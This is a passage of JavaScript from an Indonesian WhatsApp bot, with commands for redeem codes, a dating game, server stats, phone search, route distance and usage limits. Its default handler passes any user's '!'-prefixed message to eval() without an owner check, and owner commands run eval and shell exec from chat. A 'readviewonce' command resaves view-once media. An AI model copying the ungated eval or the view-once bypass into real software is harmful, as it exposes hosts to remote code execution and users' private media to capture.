let h1 = randomNumber(10, 20)
db.data.users[m.sender].limit += h1
var teks = `Selamat kepada @${m.sender.split("@")[0]} 🎉

kamu mendapatkan *${h1} Limit* dari *Code Redeem "${args[0]}"*`
await ReplyRynzz(`Berhasil mengambil hadiah *${h1} Limit* dari *Code Redeem ${args[0]}*`).then(() => {
Alice.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: thumb, title: "© Message System Notifikasi", body: null, sourceUrl: xtele, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
})}
break

case "buathadiah":{
if (!isOwner) return Xowner()
if (isNaN(args[0])) return ReplyRynzz('Jumlah Kode Hadiah')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
ReplyRynzz(teks)
}
break

			case 'tembak': {
if (isBan) return Xban()
await xreaction()
				if (!m.isGroup) return Xgroup()
				Alice.jadian = Alice.jadian ? Alice.jadian : {}
				let user = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!text) return ReplyRynzz(`tag/reply seseorang, contoh:\n${XyrooRynzz} @628888`)
				if (user === m.sender) return ReplyRynzz("njrrr stresss")
				if (user === botNumber) return ReplyRynzz("njrrr sama bot, edan😂")
				let pasangan = global.db.data.users[user].pacar
				let pasangan2 = global.db.data.users[m.sender].pacar
				if (pasangan2 === user) {
					ReplyRynzz(`itu kan pacarr lu njrr`)
				} else if (pasangan) {
					ReplyRynzz(`udah ada pacar nya njrrr\n\nwoii @${pasangan.split("@")[0]} ayangmu mau di ambil`)
				} else if (pasangan2) {
					ReplyRynzz(`lakh, mau selingkuh?\n\nwoii @${pasangan2.split("@")[0]} liat nih, dia mau selingkuh`)
				} else {
                    let ktnmbk = [
                        "ada saat di mana aku nggak suka sendiri. tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.", "aku baru sadar ternyata selama ini kamu kaya! kaya yang aku cari selama ini. kamu mau nggak jadi pacarku?", "aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.", "aku boleh kirim cv ke kamu nggak? soalnya aku mau ngelamar jadi pacar.", "aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?", "aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. maukah kamu menerima cintaku?", "aku ingin bilang sesuatu. udah lama aku suka sama kamu, tapi aku nggak berani ngomong. jadi, kuputuskan untuk wa saja. aku pengin kamu jadi pacarku.", "aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. aku mencintaimu, maukah kamu menjadi pacarku?", "aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. maukah kau jadi pacarku?", "aku mau chat serius sama kamu. selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. kalau nggak keberatan, kamu mau jadi pacarku?", "aku melihatmu dan melihat sisa hidupku di depan mataku.", "aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.", "aku menyukaimu dari dulu. kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. akan sempurna jika kamu yang menjadi spesial di hati.", "aku naksir banget sama kamu. maukah kamu jadi milikku?", "aku nggak ada ngabarin kamu bukan karena aku nggak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. mungkin kamu akan kaget mendengarnya. selama ini aku menyukaimu.", "aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.", "aku nggak tahu sampai kapan usiaku berakhir. yang aku tahu, cintaku ini selamanya hanya untukmu.", "aku sangat menikmati waktu yang dihabiskan bersama hari ini. kita juga sudah lama saling mengenal. di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.", "aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. maukah kamu menjadi kekasihku?", "aku siapkan mental untuk hari ini. kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.", "aku tahu kita nggak seumur, tapi bolehkan aku seumur hidup sama kamu?", "aku tahu kita sudah lama sahabatan. tapi nggak salah kan kalau aku suka sama kamu? apa pun jawaban kamu aku terima. yang terpenting itu jujur dari hati aku yang terdalam.", "aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. jika kau mengerti akan kode ini maka kita akan bersama.", "aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.", "apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. karena berada di sampingmu, anugerah terindah bagiku. jadilah kekasihku, hey kamu.", "atas izin allah dan restu mama papa, kamu mau nggak jadi pacarku?", "bagaimana kalau kita jadi komplotan pencuri? aku mencuri hatimu dan kau mencuri hatiku.", "bahagia itu kalau aku dan kamu telah menjadi kita.", "besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. biar aku ada kerjaan buat selalu mikirin kamu.", "biarkan aku membuatmu bahagia selamanya. kamu hanya perlu melakukan satu hal: jatuh cinta denganku.", "biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!", "biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?", "bisakah kamu memberiku arahan ke hatimu? sepertinya aku telah kehilangan diriku di matamu.", "bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. dijawab ya.", "caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. aku mau kamu jadi milikku.", "cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.", "cintaku ke kamu tuh kayak angka 5 sampai 10. nggak ada duanya. aku mau kamu jadi satu-satunya wanita di hatiku.", "cowok mana yang berani-beraninya nyakitin kamu. sini aku obati, asal kamu mau jadi pacar aku.", "hai, kamu lagi ngapain? coba deh keluar rumah dan lihat bulan malam ini. cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?", "hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. senyummu menerangi hidupku dan semua kegelapan menghilang. maukah kamu menjadi milikku?", "ini bukan rayuan, tapi ini yang aku rasakan. aku ingin bertukar tulang denganmu. aku jadi tulang punggungmu, kamu jadi tulang rusukku. jadian yuk!", "ini cintaku, ambillah. ini jiwaku, gunakan itu. ini hatiku, jangan hancurkan. ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.", "izinkan aku mengatakan sesuatu yang menurutku sangat penting. hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. tetaplah di sana dan jadilah kekasihku. mau?", "jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. biarkan aku melakukannya sekarang.", "kalau aku matahari, kamu mau nggak jadi langitku? biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.", "kalau kamu membuka pesan ini, berarti kamu suka sama aku. kalau kamu membalas pesan ini, artinya kamu sayang sama aku. kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.", "kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.", "kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. aku ingin kamu selalu bersamaku. aku mencintaimu.", "kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.", "kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. maukah kamu jadi pacar aku?", "kamu kenal iwan nggak? iwan to be your boy friend.", "kamu mau nggak jadi matahari di kehidupanku? kalau mau, menjauhlah 149.6 juta km dari aku sekarang!", "kamu nggak capek hts-an sama aku? aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. kita pacaran aja, yuk?", "kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. iya, aku.", "kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. apakah kamu akan membiarkan aku menjadi orangnya?", "kamu tahu enggak kenapa aku ngambil jurusan elektro? karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.", "kamu tahu kenapa hari ini aku menyatakan semua ini padamu? karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.", "kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?", "kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. aku mau kamu jadi milikku.", "kepada cewek incaran bukanlah perkara yang mudah. ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.", "ketika aku bertemu denganmu, aku tak peduli dengan semuanya. namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. dan apakah ini cinta?", "ketika engkau memandangku, engkau akan melihat fisikku. tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.", "ketika hawa tercipta buat sang adam, begitu indah kehidupan mereka. izinkan aku menjadi sang adam/hawa buatmu karena aku sangat mencintaimu.", "ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.", "kita udah saling tahu masa lalu masing-masing. tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?", "ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. resah jika kamu tak menjadi milikku selamanya.", "lebih spesial dari nasi goreng, lebih indah dari purnama. ya, jika kamu yang temani akhir hidupku.", "maaf sebelumnya karena cuma bisa bilang lewat wa. sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. mau?", "makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.", "makan tahu bumbu petis. merenung sambil makan buah duku. aku bukan lelaki yang romantis. namun, maukah kau jadi pacarku?", "makasih, ya, selama ini sudah mau temani aku. entah itu dalam suka ataupun duka. tapi sekarang aku mau kamu berubah. aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.", "malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.", "mau jadi pacarku nggak, lagi gabut nih. coba dulu 1 bulan kalau nyaman lanjut deh.", "menjadi teman memang menyenangkan. akan lebih membahagiakan jika kamu menjadi milikku.", "meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - zarry hendrik", "meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.", "mungkin aku bukan obama, tapi aku senang kalau bisa manggil kamu, o sayang. kamu mau nggak mulai saat ini aku panggil seperti itu?", "mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. tapi satu yang aku sanggup, membuatmu bahagia. izinkan aku membuktikannya, ya!", "neng, bakar-bakaran yuk! | bakar apa? | kita bakar masa lalu dan buka lembaran baru dengan cinta kita.", "nggak perlu basa basi. kita udah kenal lama, aku suka kamu apa adanya. jadian yuk!", "pepatah mengatakan, empat sehat lima sempurna. namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.", "saatnya aku mengungkapkan perasaan yang terdalam kepadamu. aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.", "saking jatuh cintanya aku sama kamu. mendengar kamu kentut aja aku sudah bahagia.", "satu tambah satu sama dengan dua. aku tanpamu nggak bisa apa-apa. satu dua tiga sepuluh. aku maunya kamu jadi pacarku.", "secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.", "sejak kenal kamu, bawaannya pengin belajar terus. belajar jadi yang terbaik. untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?", "senjata bertuah amatlah sakti. kalah oleh iman nan hakiki. maukah kau jadi orang yang aku kasihi? aku janji cintaku sampai mati.", "seseorang bermimpi tentangmu setiap malam. seseorang tidak bisa bernapas tanpamu, kesepian. seseorang berharap suatu hari kau akan melihatnya. seseorang itu adalah aku.", "setelah hari berlalu, aku yakin kamu pilihanku.", "setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. aku mencintaimu.", "suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. perempuan itu adalah kamu.", "suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?", "tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.", "tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.", "tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.", "tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. itu adalah kamu.", "telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. karena aku mau kamu jadi pacar aku?", "tidak peduli seberapa sederhanya dan ketidakjelasan kamu. tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. aku mau kamu jadi pacarku.", "untuk apa memajang foto berdua? yang aku mau fotomu ada dalam buku nikahku kelak. maukah kamu jadi pacarku?"
];
					let katakata = await pickRandom(ktnmbk)
					let teks = `love Message...\n\n> @${m.sender.split("@")[0]}\n❤️❤️\n@${user.split("@")[0]}\n\n"${katakata}"`
					Alice.jadian[user] = [
						ReplyRynzz(teks),
						m.sender
					]
					ReplyRynzz(`kamu baru saja mengajak @${user.split("@")[0]} jadian\n\n@${user.split("@")[0]} silahkan beri keputusan🎉\n${Xyroo}terima atau ${Xyroo}tolak`)
				}
			}
			break

			case 'terima': {
if (isBan) return Xban()
await xreaction()
				if (!m.isGroup) return Xgroup()
				if (Alice.jadian[m.sender]) {
					let user = Alice.jadian[m.sender][1]
					global.db.data.users[user].pacar = m.sender
					global.db.data.users[m.sender].pacar = user
					ReplyRynzz(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng 🙈😋`)
					delete Alice.jadian[m.sender]
				} else {
					ReplyRynzz("anjirr?")
				}
			}
			break
                
			case 'tolak': {
if (isBan) return Xban()
await xreaction()
				if (!m.isGroup) return Xgroup()
				if (Alice.jadian[m.sender]) {
					let user = Alice.jadian[m.sender][1]
					ReplyRynzz(`@${user.split("@")[0]} wowkaowka di tolak`)
					delete Alice.jadian[m.sender]
				} else {
					ReplyRynzz("anjirr?")
				}
			}
			break
                
			case 'putus': {
if (isBan) return Xban()
await xreaction()
				if (!m.isGroup) return Xgroup()
				let pasangan = global.db.data.users[m.sender].pacar
				if (pasangan) {
					global.db.data.users[m.sender].pacar = ""
					global.db.data.users[pasangan].pacar = ""
					ReplyRynzz(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
				} else {
					ReplyRynzz("anjirr?")
				}
			}
			break
                
			case 'cekpacar': {
if (isBan) return Xban()
await xreaction()
				if (!m.isGroup) return Xgroup()
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return ReplyRynzz(`tag/reply seseorang, contoh: ${XyrooRynzz} @628888`)
					let pasangan = global.db.data.users[user].pacar
					if (pasangan) {
						ReplyRynzz(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
					} else {
						ReplyRynzz(`@${user.split("@")[0]} masih jomblo`)
					}
				} catch (error) {
                      let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					ReplyRynzz(`@${user.split("@")[0]} tidak ada didalam database njrrr`)
				}
			}
			break

case 'ping':
case 'info':
case 'storage':
case 'server':
case 'srvinfo': {
  const os = require('os')
  const nou = require('node-os-utils')

  function formatp(bytes) {
    if (bytes < 1024) return `${bytes} B`
    const kb = bytes / 1024
    if (kb < 1024) return `${kb.toFixed(2)} KB`
    const mb = kb / 1024
    if (mb < 1024) return `${mb.toFixed(2)} MB`
    const gb = mb / 1024
    return `${gb.toFixed(2)} GB`
  }

  async function getServerInfo() {
    try {
      const osType = nou.os.type()
      const release = os.release()
      const arch = os.arch()
      const nodeVersion = process.version
      const ip = await nou.os.ip()

      const cpus = os.cpus()
      const cpuModel = cpus[0].model
      const coreCount = cpus.length
      const cpu = cpus.reduce((acc, cpu) => {
        acc.total += Object.values(cpu.times).reduce((a, b) => a + b, 0)
        acc.speed += cpu.speed
        acc.times.user += cpu.times.user
        acc.times.nice += cpu.times.nice
        acc.times.sys += cpu.times.sys
        acc.times.idle += cpu.times.idle
        acc.times.irq += cpu.times.irq
        return acc
      }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } })
      const cpuUsage = ((cpu.times.user + cpu.times.sys) / cpu.total * 100).toFixed(2) + '%'
      const loadAverage = os.loadavg()
      const totalMem = os.totalmem()
      const freeMem = os.freemem()
      const usedMem = totalMem - freeMem
      const storageInfo = await nou.drive.info()
      const speed = require('performance-now')
      const timestamp = speed()
      const latensi = speed() - timestamp
      const responseText = `
 *INFO SERVER*
• OS: ${osType} (${release})
• Arsitektur: ${arch}
• Versi Node.js: ${nodeVersion}

 *CPU SISTEM*
• Model: ${cpuModel}
• Kecepatan: ${cpu.speed} MHz
• Beban CPU: ${cpuUsage} (${coreCount} Core)
• Load Average: ${loadAverage.join(', ')}

 *MEMORI (RAM)*
• Total: ${formatp(totalMem)}
• Digunakan: ${formatp(usedMem)}
• Tersedia: ${formatp(freeMem)}

 *PENYIMPANAN*
• Total: ${storageInfo.totalGb} GB
• Digunakan: ${storageInfo.usedGb} GB (${storageInfo.usedPercentage}%)
• Tersedia: ${storageInfo.freeGb} GB (${storageInfo.freePercentage}%)

 *PING*
• Latensi: ${latensi.toFixed(4)} detik
`
      return responseText.trim()
    } catch (error) {
      console.error('Error mendapatkan informasi server:', error)
      return 'Terjadi kesalahan dalam mendapatkan informasi server.'
    }
  }

  getServerInfo().then(responseText => {
    Alice.sendMessage(m.chat, { text: responseText }, { quoted: m })
  })
}
break

case 'gsmarena': {
if (isBan) return Xban()
await xreaction()
 if (args.length === 0) {
 ReplyRynzz('Silakan masukkan nama perangkat yang ingin dicari.');
 return;
 }

 async function gsmSearch(q) {
 try {
 const response = await axios({
 method: "get",
 url: `https://gsmarena.com/results.php3?sQuickSearch=yes&sName=${q}`
 });
 const $ = cheerio.load(response.data);
 const result = [];
 
 const device = $(".makers").find("li");
 device.each((i, e) => {
 const img = $(e).find("img");
 result.push({
 id: $(e).find("a").attr("href").replace(".php", ""),
 name: $(e).find("span").html().split("<br>").join(" "),
 description: img.attr("title")
 });
 });
 return result;
 } catch (error) {
 console.error(error);
 throw error;
 }
 }

 gsmSearch(q).then(results => {
 if (results.length === 0) {
 ReplyRynzz('Tidak ada hasil yang ditemukan.');
 return;
 }
 
 let replyText = `Hasil pencarian untuk "${q}":\n\n`;
 results.forEach((device, index) => {
 replyText += `${index + 1}. ${device.name}\nDeskripsi: ${device.description}\nLink: https://gsmarena.com/${device.id}.php\n\n`;
 });
 
 ReplyRynzz(replyText);
 }).catch(error => {
 ReplyRynzz('Terjadi kesalahan saat mencari perangkat.');
 console.error(error);
 });
}
break

case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
if (isBan) return Xban()
await xreaction()
     if (!text.includes('|')) return ReplyRynzz(`Example: ${XyrooRynzz} jakarta|bandung`);
 
 let [from, to] = text.split('|').map(v => v.trim());
 let xyroorinzi = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
      try {
 let response = await fetch(xyroorinzi);
 let data = await response.json();
 if (data.status !== 200) return ReplyRynzz('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
    let result = data.result;
    let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
    ReplyRynzz(msg);
 } catch (e) {
 console.error(e);
 ReplyRynzz('Terjadi kesalahan saat mengambil data!');
    }
 break

		case "getpic":
		case "getpp": {
if (isBan) return Xban()
await xreaction()
			if (mentionByReply) {
				try {
					var ppWong = await Alice.profilePictureUrl(mentionByReply, "image")
				} catch {
					var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
				}
				Alice.sendMessage(m.chat, {
					image: {
						url: ppWong
					},
					caption: `Succes!!`
				}, {
					quoted: m
				})
			} else {
				try {
					var ppWong = await Alice.profilePictureUrl(m.sender, "image")
				} catch {
					var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
				}
				Alice.sendMessage(m.chat, {
					image: {
						url: ppWong
					},
					caption: `Succes!!`
				}, {
					quoted: m
				})
			}
		}
		break

		case "getppgc":
if (isBan) return Xban()
await xreaction()
			if (!m.isGroup) return
			await xreaction()
			try {
				var ppimg = await Alice.profilePictureUrl(m.chat, "image")
			} catch (err) {
				console.log(err)
				var ppimg = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"
			}
			await Alice.sendMessage(m.chat, {
				image: {
					url: ppimg
				}
			}, {
				quoted: m
			})
			break
			
case "rvo": case "readviewonce": {
if (isBan) return Xban()
await xreaction()
if (!m.quoted) return ReplyRynzz("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return ReplyRynzz("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Alice.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Alice.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Alice.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "ceklimit": case "limit": case "me": case "my": {
if (isBan) return Xban()
await xreaction()
ReplyRynzz(`
  ◦ Name : *${pushname}*
  ◦ Number : *@${m.sender.split('@')[0]}*
  ◦ Limit : *${limitnya}*`)
}
break

case 'addlimit': {
if (!isOwner) return Xowner()
    if (!text) return ReplyRynzz('Format salah!\n\nTambah limit: addlimit <tag orang> <jumlah limit>\nKurangi limit: .dellimit <tag orang> <jumlah limit>')
    
    // Extracting the mentioned user and the limit value from the command text
    let [who, limitValue] = text.split(' ')
    if (!who) return ReplyRynzz('Tag orang yang akan diubah limitnya!')
    if (isNaN(limitValue)) return ReplyRynzz('Jumlah limit harus angka!')

    // Converting limitValue to a number
    limitValue = parseInt(limitValue)

    let user = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
    let users = global.db.data.users

    // Checking if the user is in the database, if not, initialize their limit to 0
    if (!users[user]) users[user] = { limit: 0 }

    // Determining whether to add or remove limit based on the command
    if (command === 'addlimit') {
        // Adding the specified limit to the user's account
        users[user].limit += limitValue
        ReplyRynzz(m.chat, `Berhasil menambahkan ${limitValue} limit untuk @${user.split('@')[0]}!`, m)
    } else if (command === 'remlimit') {
        if (limitValue > users[user].limit) {
            // Set the user's limit to 0 if the specified limit is greater than the user's current limit
            users[user].limit = 0
            ReplyRynzz(m.chat, `Berhasil mengurangi limit untuk @${user.split('@')[0]}. Limit kini menjadi 0!`, m)
        } else {
            // Removing the specified limit from the user's account
            users[user].limit -= limitValue
            ReplyRynzz(m.chat, `Berhasil mengurangi ${limitValue} limit untuk @${user.split('@')[0]}!`, m)
        }
    }
}
break
case 'dellimit':{
if (!isOwner) return Xowner()
  if (!text) {
    return ReplyRynzz(m.chat, '• *Example :* .dellimit @user 10', m)
  }

  let mentionedJid = m.mentionedJid[0];
  if (!mentionedJid) {
     return ReplyRynzz(m.chat, 'Tag pengguna yang ingin dikurangi limitnya. Contoh: .dellimit @user 10', m)
  }

  let pointsToSubtract = parseInt(text.split(' ')[1]);
  if (isNaN(pointsToSubtract)) {
    return ReplyRynzz(m.chat, 'Jumlah limit yang dimasukkan harus berupa angka. Contoh: .dellimit @user 10', m)
  }

  let users = global.db.data.users;
  if (!users[mentionedJid]) {
    users[mentionedJid] = {
      limit: 0,
      exp: 0,
      lastclaim: 0
    };
  }

  users[mentionedJid].limit -= pointsToSubtract;
  if (users[mentionedJid].limit < 0) {
    users[mentionedJid].limit = 0;
  }

  ReplyRynzz(m.chat, `Berhasil mengurangi ${pointsToSubtract} limit untuk @${mentionedJid.split('@')[0]}.`, m, {
    mentions: [mentionedJid]
  });
};
break;
case 'resetlimit': {
if (!isOwner) return Xowner()
let listt = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 0 : isNumber(args[0]) ? parseInt(args[0]) : 0
	lim = Math.max(1, lim)
	listt.map(([user, data], i) => (Number(data.limit = lim)))
ReplyRynzz(m.chat, `*Limit berhasil direset ${lim} / user*`, m)
}
            break 
            
case 'totalfitur':{
ReplyRynzz(`Total Fitur Bot : ${totalfitur()}`)
}
break


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Batas All Case
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
default:
if (budy.startsWith('!')) {
try {
return ReplyRynzz(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
ReplyRynzz(e)
}
}
 
if (budy.startsWith('=>')) {
if (!isOwner) return false
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRynzz(bang)}
try {
ReplyRynzz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRynzz(String(e))}}
if (budy.startsWith('>')) {
if (!isOwner) return false
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRynzz(evaled)
} catch (err) {
await ReplyRynzz(String(err))}}
if (budy.startsWith('$')) {
if(!isOwner) return false
exec(budy.slice(2), (err, stdout) => {
if(err) return ReplyRynzz(err)
if (stdout) return ReplyRynzz(stdout)})}

if (m.chat.endsWith('@s.whatsapp.net')) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(budy)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(budy)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}} : {})
}}

if (m.chat.endsWith('@s.whatsapp.net')) {
this.anonymous = this.anonymous ? this.anonymous : {}
